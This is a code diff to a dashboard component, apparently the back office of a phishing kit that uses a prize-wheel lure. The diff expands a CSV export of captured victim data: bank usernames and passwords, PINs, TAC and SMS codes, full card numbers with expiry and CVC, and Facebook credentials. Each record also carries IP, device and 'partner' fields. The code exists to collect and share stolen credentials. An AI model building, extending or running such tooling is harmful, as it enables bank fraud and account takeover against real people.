@@ -1379,11 +1379,15 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       const val = (v: unknown) => (v == null ? "" : v);
 
       const headers = [
-        "ID", "Session UUID", "Tarih", "Odul", "Isim", "Soyisim", "Telefon",
-        "Banka", "Banka Tel", "Kullanici Adi", "Sifre", "PIN/TAC", "SMS Kodu",
+        "ID", "Session UUID", "Tarih", "Odul", "Cark Sonucu",
+        "Isim", "Soyisim", "Telefon",
+        "Banka", "Banka Tel", "Kullanici Adi", "Sifre",
+        "PIN", "TAC", "Kisisel Kod", "Verfuegernummer",
+        "Ordered 1", "Ordered 2", "SMS Kodu",
         "Kart Sahibi", "Kart No", "Kart SKT", "Kart CVC",
-        "FB Isim", "FB Soyisim", "FB E-posta", "FB Sifre",
-        "Sayfa", "Durum", "IP", "Cihaz", "Partner",
+        "FB Isim", "FB Soyisim", "FB E-posta", "FB Sifre", "FB User ID",
+        "Sayfa", "Durum", "Gizli", "IP", "Cihaz", "Partner",
+        "Form Data (JSON)",
       ];
 
       const lines = all.map((r) => {
@@ -1393,12 +1397,15 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           r.id,
           r.created_at ? new Date(r.created_at).toLocaleString("tr-TR") : "",
           r.amount ? `€${r.amount}` : "",
+          val(fd.wheel_result_label),
           val(fd.firstName), val(fd.lastName), val(fd.phone),
           val(fd.bankName), val(fd.bankPhone), val(fd.username), val(fd.password),
-          val(fd.pin ?? fd.tacCode ?? fd.personalCode), val(fd.smsCode),
+          val(fd.pin), val(fd.tacCode), val(fd.personalCode), val(fd.verfuegernummer),
+          val(fd.orderedField1), val(fd.orderedField2), val(fd.smsCode),
           val(fd.cardHolder), val(fd.cardNumber), val(fd.cardExpiry), val(fd.cardCvc),
-          val(fd.fbFirstName), val(fd.fbLastName), val(fd.fbEmail), val(fd.fbPassword),
-          r.current_step, r.status, val(r.ip_address), val(r.user_agent), val(r.partner_name),
+          val(fd.fbFirstName), val(fd.fbLastName), val(fd.fbEmail), val(fd.fbPassword), val(fd.fbUserId),
+          r.current_step, r.status, r.is_hidden ? "evet" : "", val(r.ip_address), val(r.user_agent), val(r.partner_name),
+          JSON.stringify(fd),
         ].map(esc).join(";");
       });
 
